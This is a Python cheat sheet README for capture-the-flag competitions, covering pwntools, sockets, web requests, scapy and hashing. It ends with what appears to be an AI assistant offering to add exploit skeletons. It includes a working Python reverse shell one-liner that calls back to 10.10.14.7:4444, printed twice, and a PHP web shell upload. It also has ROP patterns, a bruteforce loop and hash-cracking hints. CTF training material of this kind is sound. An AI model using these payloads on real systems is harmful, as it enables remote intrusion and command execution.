# Python for CTFs — Complete Cheat Sheet (README)

> Extended, battle-ready README focused on CTF tooling & scripting in Python. Includes pwning (pwntools), sockets, WebSocket, web interactions, binary helpers, packing/unpacking, automation, network/pcap parsing, and **comprehensive hashing & password-related utilities**.

---

## 🔧 Typical imports

```python
# Core
import sys, os, subprocess, struct, time, base64, binascii, hashlib, hmac, json, re
from collections import defaultdict

# Networking
import socket
import ssl
import asyncio

# HTTP / Web
import requests
from urllib.parse import urljoin, quote_plus

# WebSockets
import websockets                    # asyncio client
from websocket import create_connection  # websocket-client (blocking)

# PWNING
from pwn import *                    # pwntools

# PCAP / packets
from scapy.all import rdpcap, TCP

# Password libs (optional)
import bcrypt
# argon2 via argon2-cffi
from argon2 import PasswordHasher
```

---

## 🧨 Pwntools (core patterns)

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
# local process
p = process('./vuln')
# remote
r = remote('target.ip', 31337)
# send/recv
r.sendline(b'hello')
print(r.recvuntil(b'ok\n'))
# interactive
r.interactive()
# ELF & libc
elf = ELF('./vuln')
libc = ELF('./libc.so.6')
# cyclic for offsets
payload = cyclic(300)
off = cyclic_find(0x61616162)

# ROP
rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
```

---

## 🔁 Packing & Unpacking

```python
# pack/unpack little-endian
p32 = lambda x: struct.pack('<I', x)
u32 = lambda b: struct.unpack('<I', b)[0]
p64 = lambda x: struct.pack('<Q', x)
u64 = lambda b: struct.unpack('<Q', b)[0]

# recv fixed bytes from pwntools remote
data = r.recvn(8)  # recv exactly 8
val = u64(data)
```

---

## 🕸️ Web & WebSocket

```python
# HTTP (requests)
s = requests.Session()
r = s.get('http://target/endpoint', timeout=5)
# upload
files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>')}
r = s.post('http://target/upload', files=files)

# websocket-client (blocking)
from websocket import create_connection
ws = create_connection('ws://target/ws')
ws.send(json.dumps({'cmd':'hello'}))
print(ws.recv())
ws.close()

# websockets (asyncio)
import asyncio, websockets
async def run():
    async with websockets.connect('ws://target/ws') as ws:
        await ws.send('ping')
        msg = await ws.recv()
        print(msg)
asyncio.run(run())
```

---

## 🔗 Sockets & Reverse Shells

```python
# TCP client
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.14.7', 4444))
s.sendall(b'whoami\n')
print(s.recv(4096))

# tiny reverse shell
import os,pty
s=socket.socket();s.connect(('10.10.14.7',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')
```

---

## 🧪 PCAP / Network parsing (scapy)

```python
from scapy.all import rdpcap
pkts = rdpcap('dump.pcap')
for p in pkts:
    if p.haslayer(TCP) and p[TCP].dport == 80:
        payload = bytes(p[TCP].payload)
        if b'flag{' in payload:
            print(payload)
```

---

## 🔁 Automation & Helpers

```python
# retry decorator
import time

def retry(fn, retries=5, delay=1):
    for i in range(retries):
        try:
            return fn()
        except Exception as e:
            time.sleep(delay)
    raise

# threaded bruteforce (example)
from concurrent.futures import ThreadPoolExecutor
with ThreadPoolExecutor(max_workers=20) as ex:
    for res in ex.map(lambda u: try_user(u), users):
        if res: print(res)
```

---

## 🔐 Hashes & Password Utilities (COMPREHENSIVE)

This section shows how to compute, verify, and use many common hashes and password-derived functions used in CTFs and real-world challenges.

### 🔸 Python `hashlib` (MD5 / SHA1 / SHA256 / SHA512 / SHA3 / BLAKE2)

```python
import hashlib
# md5
hashlib.md5(b'data').hexdigest()
# sha1
hashlib.sha1(b'data').hexdigest()
# sha256
hashlib.sha256(b'data').hexdigest()
# sha512
hashlib.sha512(b'data').hexdigest()
# sha3_256
hashlib.sha3_256(b'data').hexdigest()
# blake2b / blake2s
hashlib.blake2b(b'data').hexdigest()
```

**Common lengths**: MD5=32 hex (128-bit), SHA1=40 hex (160-bit), SHA256=64 hex (256-bit), SHA512=128 hex (512-bit), SHA3-256=64 hex.

### 🔸 HMAC (keyed hash)

```python
import hmac
hmac.new(b'secret', b'message', hashlib.sha256).hexdigest()
```

### 🔸 PBKDF2 (password stretching)

```python
# derive 32-byte key using SHA256
key = hashlib.pbkdf2_hmac('sha256', b'password', b'salt', 100000)
key.hex()
```

### 🔸 bcrypt (slow hash)

```python
import bcrypt
pw = b'password'
h = bcrypt.hashpw(pw, bcrypt.gensalt(rounds=12))
# verify
bcrypt.checkpw(pw, h)
```

### 🔸 scrypt (memory-hard)

```python
# Python 3.6+: hashlib.scrypt
key = hashlib.scrypt(b'password', salt=b'salt', n=2**14, r=8, p=1, dklen=64)
```

### 🔸 Argon2 (modern KDF)

```python
from argon2 import PasswordHasher
ph = PasswordHasher()
h = ph.hash('password')
ph.verify(h, 'password')
```

### 🔸 Common hash-cracking hints

* Use wordlists (rockyou) and hashcat; identify hash type by length and prefix.
* MD5/SHA1 often unsalted — try hashcat modes 0 (MD5) / 100 (SHA1) / 1400 (SHA256).
* bcrypt and argon2 are slow — prefer online/offline appropriate attacks (dictionary + rules).
* For HMAC, you need the key; for PBKDF2/scrypt/argon2, parameters (salt, rounds) are required.

---

## 🧩 Encoding & Crypto Helpers

```python
# base64
base64.b64encode(b'data').decode()
base64.b64decode('ZmxhZw==')
# hex
bytes.fromhex('deadbeef')
# xor
def xor(data, key):
    return bytes(a ^ key for a in data)

# AES example (pycryptodome)
from Crypto.Cipher import AES
cipher = AES.new(key, AES.MODE_ECB)
plain = cipher.decrypt(ct)
```

---

## 🧾 File & Binary helpers

```python
# printable strings
import re
with open('bin','rb') as f:
    print(re.findall(b'[ -~]{4,}', f.read()))

# recursive flag search
import os, re
pat = re.compile(rb'flag\{[A-Za-z0-9_\-]+\}')
for root,_,files in os.walk('.'):
    for fn in files:
        p = os.path.join(root,fn)
        try:
            d = open(p,'rb').read()
        except:
            continue
        for m in pat.findall(d):
            print(p, m)
```

---

## 🔎 Useful One-Liners & Patterns

```python
# quick HTTP server
python3 -m http.server 8000

# small reverse shell via Python
import socket,os,pty
s=socket.socket();s.connect(('10.10.14.7',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')

# test hash quickly
import hashlib
print(hashlib.md5(b'flag').hexdigest())
```

---

## ✅ Tips & best practices

* Use `pwntools` for process/remote interaction — it's concise and battle-tested.
* Keep small helpers (pack/unpack, recvuntil) in a local module for reuse.
* For hashes, always be explicit about encoding (`.encode()` / `b''`) to avoid subtle bugs.
* Use virtualenvs and pin dependencies (pwntools, scapy, websockets, bcrypt, argon2-cffi).

---

*Want this saved into your repo README, or should I add exploit skeletons (ret2libc, heap, format string) and example hashcat commands for each hash type?*
